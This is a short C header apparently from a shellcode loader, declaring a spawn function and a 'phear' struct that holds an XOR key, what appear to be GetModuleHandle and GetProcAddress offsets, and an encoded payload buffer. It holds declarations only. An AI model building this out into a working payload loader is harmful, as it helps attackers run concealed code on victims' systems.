#pragma once

void spawn(void * buffer, int length, char * key);

typedef struct {
	int  offset;
	int  length;
	char key[8]; // 8 byte XoR
	int  gmh_offset;
	int  gpa_offset;
	char payload[DATA_SIZE];
} phear;



extern char data[sizeof(phear)];

